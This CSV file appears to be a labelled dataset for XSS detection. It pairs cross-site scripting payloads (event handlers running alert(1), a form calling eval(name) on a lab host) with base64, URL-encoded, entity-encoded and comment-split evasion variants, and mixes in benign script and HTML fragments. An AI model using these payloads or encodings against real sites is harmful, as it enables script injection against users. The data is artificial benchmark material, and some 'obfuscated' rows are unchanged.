sample_id,variant_id,technique,payload_original,payload_obfuscated,label
75,1,base64,<big onpointermove=alert(1)>xss</big>,PGJpZyBvbnBvaW50ZXJtb3ZlPWFsZXJ0KDEpPnhzczwvYmlnPg==,1
75,2,urlencode,<big onpointermove=alert(1)>xss</big>,%3Cbig%20onpointermove%3Dalert%281%29%3Exss%3C%2Fbig%3E,1
75,3,comment_marker,<big onpointermove=alert(1)>xss</big>,<big onpointermove=alert(1)>xss</big>,1
76,1,html_entities,"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",&lt;div draggable=&quot;true&quot; contenteditable&gt;drag me&lt;/div&gt;&lt;dl ondragover=alert(1) contenteditable&gt;drop here&lt;/dl&gt;,1
76,2,double_urlencode,"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",%253Cdiv%2520draggable%253D%2522true%2522%2520contenteditable%253Edrag%2520me%253C%252Fdiv%253E%253Cdl%2520ondragover%253Dalert%25281%2529%2520contenteditable%253Edrop%2520here%253C%252Fdl%253E,1
76,3,urlencode,"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cdl%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fdl%3E,1
77,0,none,if ( value >= xval.slice(-1)[0] ){ return 100; },if ( value >= xval.slice(-1)[0] ){ return 100; },0
78,0,none,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,0
79,1,base64,<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,PHdiciBvbmJsdXI9YWxlcnQoMSkgdGFiaW5kZXg9MSBpZD14Pjwvd2JyPjxpbnB1dCBhdXRvZm9jdXM+,1
79,2,double_urlencode,<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,%253Cwbr%2520onblur%253Dalert%25281%2529%2520tabindex%253D1%2520id%253Dx%253E%253C%252Fwbr%253E%253Cinput%2520autofocus%253E,1
79,3,whitespace_noise,<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,<wbr onblur=alert(1)   tabindex=1 id=x>  </wbr><  input autofocus>,1
80,0,none,"} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);","} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);",0
81,0,none,config.parent = index_js.getelement(config.parent); return config; },config.parent = index_js.getelement(config.parent); return config; },0
82,0,none,"<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>","<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>",0
83,0,none,"scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],","scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],",0
84,0,none,"<h4><span class=""mw-headline"" id=""logic-based"">logic-based","<h4><span class=""mw-headline"" id=""logic-based"">logic-based",0
85,1,html_entities,"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;svg style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;&gt;&lt;/svg&gt;,1
85,2,comment_marker,"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>","<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",1
85,3,base64,"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",PHN0eWxlPkBrZXlmcmFtZXMgeHt9PC9zdHlsZT48c3ZnIHN0eWxlPSJhbmltYXRpb24tbmFtZTp4IiBvbmFuaW1hdGlvbnN0YXJ0PSJhbGVydCgxKSI+PC9zdmc+,1
86,1,urlencode,"<area oncopy=""alert(1)"" contenteditable>test</area>",%3Carea%20oncopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Farea%3E,1
86,2,whitespace_noise,"<area oncopy=""alert(1)"" contenteditable>test</area>","<area oncopy=""alert(1)"" contenteditable>test</area>",1
86,3,html_then_urlencode,"<area oncopy=""alert(1)"" contenteditable>test</area>",%26lt%3Barea%20oncopy%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Farea%26gt%3B,1
87,0,none,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,0
88,1,html_entities,"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",&lt;button onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/button&gt;,1
88,2,whitespace_noise,"<button onbeforecopy=""alert(1)"" contenteditable>test</button>","<button onbeforecopy=  ""alert(  1)  "" contenteditable>  test</button>",1
88,3,base64,"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",PGJ1dHRvbiBvbmJlZm9yZWNvcHk9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvYnV0dG9uPg==,1
89,0,none,previous = previous.previouselementsibling } return [],previous = previous.previouselementsibling } return [],0
90,0,none,"} form.classlist.add('was-validated') }, false)","} form.classlist.add('was-validated') }, false)",0
91,1,html_entities,"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>",&lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;th id=x style=&quot;transition:color 10s&quot; ontransitioncancel=alert(1)&gt;&lt;/th&gt;,1
91,2,base64,"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>",PHN0eWxlPjp0YXJnZXQge2NvbG9yOiByZWQ7fTwvc3R5bGU+PHRoIGlkPXggc3R5bGU9InRyYW5zaXRpb246Y29sb3IgMTBzIiBvbnRyYW5zaXRpb25jYW5jZWw9YWxlcnQoMSk+PC90aD4=,1
91,3,urlencode,"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>",%3Cstyle%3E%3Atarget%20%7Bcolor%3A%20red%3B%7D%3C%2Fstyle%3E%3Cth%20id%3Dx%20style%3D%22transition%3Acolor%2010s%22%20ontransitioncancel%3Dalert%281%29%3E%3C%2Fth%3E,1
92,1,urlencode,"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",%3Coptgroup%20onbeforepaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Foptgroup%3E,1
92,2,double_urlencode,"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",%253Coptgroup%2520onbeforepaste%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Foptgroup%253E,1
92,3,html_then_urlencode,"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",%26lt%3Boptgroup%20onbeforepaste%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Foptgroup%26gt%3B,1
93,0,none,var ownelement = getwindow(node).element,var ownelement = getwindow(node).element,0
94,1,base64,<object onpointerout=alert(1)>xss</object>,PG9iamVjdCBvbnBvaW50ZXJvdXQ9YWxlcnQoMSk+eHNzPC9vYmplY3Q+,1
94,2,html_entities,<object onpointerout=alert(1)>xss</object>,&lt;object onpointerout=alert(1)&gt;xss&lt;/object&gt;,1
94,3,comment_marker,<object onpointerout=alert(1)>xss</object>,<object onpointerout=a/*OBF*/lert(1)>xss</ob/*OBF*/ject>,1
95,0,none,this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),0
96,1,double_urlencode,<x @[_b.constructor`alert(1)`()]>,%253Cx%2520%2540%255B_b.constructor%2560alert%25281%2529%2560%2528%2529%255D%253E,1
96,2,base64,<x @[_b.constructor`alert(1)`()]>,PHggQFtfYi5jb25zdHJ1Y3RvcmBhbGVydCgxKWAoKV0+,1
96,3,whitespace_noise,<x @[_b.constructor`alert(1)`()]>,<x @[_b.constructor`alert(1)`()]> ,1
97,0,none,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,0
98,0,none,"<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>","<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>",0
99,0,none,"<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:","<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:",0
100,0,none,"<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august","<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august",0
101,0,none,"<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0
102,1,double_urlencode,"<area onmouseover=""alert(1)"">test</area>",%253Carea%2520onmouseover%253D%2522alert%25281%2529%2522%253Etest%253C%252Farea%253E,1
102,2,urlencode,"<area onmouseover=""alert(1)"">test</area>",%3Carea%20onmouseover%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,1
102,3,html_entities,"<area onmouseover=""alert(1)"">test</area>",&lt;area onmouseover=&quot;alert(1)&quot;&gt;test&lt;/area&gt;,1
103,0,none,"return eventend(event, data)","return eventend(event, data)",0
104,0,none,"1 ), visibledate = date.gettime();","1 ), visibledate = date.gettime();",0
105,0,none,} _getoffset() { const { offset } = this._config,} _getoffset() { const { offset } = this._config,0
106,1,urlencode,"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""xss via target in a form""></form>",%3Cform%20action%3D%22http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%22%20target%3D%22alert%281%29%22%3E%3Cinput%20type%3Dhidden%20name%3Dx%20value%3D%22%27%3Beval%28name%29%2F%2F%22%3E%3Cinput%20type%3Dhidden%20name%3Dcontext%20value%3Djs_string_single%3E%3Cinput%20type%3D%22submit%22%20value%3D%22xss%20via%20target%20in%20a%20form%22%3E%3C%2Fform%3E,1
106,2,comment_marker,"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""xss via target in a form""></form>","<form action=""http://subdomain1.portswigger-labs/*OBF*/.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden na/*OBF*/me=con/*OBF*/text value=js_string_single><input ty/*OBF*/pe=""submit"" value=""x/*OBF*/ss via/*OBF*/ target in a form""></form>",1
106,3,whitespace_noise,"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""xss via target in a form""></form>","<form action= ""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)  ""><input type=hidden name=x value=""';eval(name)  //""><input type=hidden name=context value=  js_string_single><input type=""submit"" value=""xss via target in a form""></form>",1
107,1,html_entities,"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",&lt;sup onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/sup&gt;,1
107,2,whitespace_noise,"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>","<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",1
107,3,html_then_urlencode,"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",%26lt%3Bsup%20onbeforecopy%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Fsup%26gt%3B,1
108,0,none,} _animatein() { this._positiontooltip();,} _animatein() { this._positiontooltip();,0
109,0,none,}; }()); var getprefixedprop = (function () {,}; }()); var getprefixedprop = (function () {,0
110,1,urlencode,"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",%3Cthead%20onkeypress%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fthead%3E,1
110,2,comment_marker,"<thead onkeypress=""alert(1)"" contenteditable>test</thead>","<thead onkeypress=""alert(1)"" contentedita/*OBF*/ble>test</thead>",1
110,3,html_entities,"<thead onkeypress=""alert(1)"" contenteditable>test</thead>",&lt;thead onkeypress=&quot;alert(1)&quot; contenteditable&gt;test&lt;/thead&gt;,1
111,0,none,"<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>","<li><a href=""/wiki/idealism"" title=""idealism"">idealism </a> </li>",0
112,1,whitespace_noise,"<div onbeforecut=""alert(1)"" contenteditable>test</div>","<div onbeforecut=""alert(1)"" contenteditable>test</div>",1
112,2,comment_marker,"<div onbeforecut=""alert(1)"" contenteditable>test</div>","<div onbeforecut=""alert(1)"" contenteditable>test</div>",1
112,3,double_urlencode,"<div onbeforecut=""alert(1)"" contenteditable>test</div>",%253Cdiv%2520onbeforecut%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fdiv%253E,1
113,1,urlencode,<marquee onpointerup=alert(1)>xss</marquee>,%3Cmarquee%20onpointerup%3Dalert%281%29%3Exss%3C%2Fmarquee%3E,1
113,2,base64,<marquee onpointerup=alert(1)>xss</marquee>,PG1hcnF1ZWUgb25wb2ludGVydXA9YWxlcnQoMSk+eHNzPC9tYXJxdWVlPg==,1
113,3,html_then_urlencode,<marquee onpointerup=alert(1)>xss</marquee>,%26lt%3Bmarquee%20onpointerup%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fmarquee%26gt%3B,1
114,1,whitespace_noise,<shadow onpointerover=alert(1)>xss</shadow>,<shadow onpointerover= alert(1)>xss</shadow>,1
114,2,html_then_urlencode,<shadow onpointerover=alert(1)>xss</shadow>,%26lt%3Bshadow%20onpointerover%3Dalert%281%29%26gt%3Bxss%26lt%3B%2Fshadow%26gt%3B,1
114,3,urlencode,<shadow onpointerover=alert(1)>xss</shadow>,%3Cshadow%20onpointerover%3Dalert%281%29%3Exss%3C%2Fshadow%3E,1
115,0,none,"} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',","} // eslint-disable-next-line import/no-unused-modules const popperoffsets$1 = { name: 'popperoffsets',",0
116,1,html_entities,"<em ondblclick=""alert(1)"">test</em>",&lt;em ondblclick=&quot;alert(1)&quot;&gt;test&lt;/em&gt;,1
116,2,base64,"<em ondblclick=""alert(1)"">test</em>",PGVtIG9uZGJsY2xpY2s9ImFsZXJ0KDEpIj50ZXN0PC9lbT4=,1
116,3,urlencode,"<em ondblclick=""alert(1)"">test</em>",%3Cem%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fem%3E,1
117,0,none,"<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks","<dt><a class=""reference internal"" href=""topics/leaks.html""><span class=""doc"">debugging memory leaks",0
118,0,none,let indicator = document.createelement('li'),let indicator = document.createelement('li'),0
119,1,urlencode,<tbody onpointermove=alert(1)>xss</tbody>,%3Ctbody%20onpointermove%3Dalert%281%29%3Exss%3C%2Ftbody%3E,1
119,2,base64,<tbody onpointermove=alert(1)>xss</tbody>,PHRib2R5IG9ucG9pbnRlcm1vdmU9YWxlcnQoMSk+eHNzPC90Ym9keT4=,1
119,3,comment_marker,<tbody onpointermove=alert(1)>xss</tbody>,<tb/*OBF*/ody onpoint/*OBF*/ermove=alert(1)>xss</tbody>,1
120,0,none,"key: ""render"", value: function render(year, month, randid) { var opts = this.options,","key: ""render"", value: function render(year, month, randid) { var opts = this.options,",0
121,0,none,"value: function rendertable(opts, data, randid) {","value: function rendertable(opts, data, randid) {",0
122,1,base64,"<b onclick=""alert(1)"">test</b>",PGIgb25jbGljaz0iYWxlcnQoMSkiPnRlc3Q8L2I+,1
122,2,html_entities,"<b onclick=""alert(1)"">test</b>",&lt;b onclick=&quot;alert(1)&quot;&gt;test&lt;/b&gt;,1
122,3,whitespace_noise,"<b onclick=""alert(1)"">test</b>","<b onclick=""alert(1)""  >test</b>",1
